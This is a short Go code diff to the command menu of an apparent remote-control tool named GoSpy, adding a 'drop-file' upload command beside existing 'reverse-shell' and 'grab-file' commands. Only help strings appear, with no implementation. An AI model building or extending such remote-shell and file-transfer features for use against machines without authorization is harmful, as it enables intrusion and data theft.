@@ -8,6 +8,7 @@ var suggestions = []prompt.Suggest{
 	{"ping", "CommandPing the connected client"},
 	{"reverse-shell", "Initiate a reverse shell"},
 	{"grab-file", "Download a file from the client; grab-file [path on client] [local path]"},
+	{"drop-file", "Upload a file to the client; drop-file [local path] [path on client]"},
 	{"exit", "Tell the GoSpy client to exit then and exit the GoSpy Server"},
 }
 
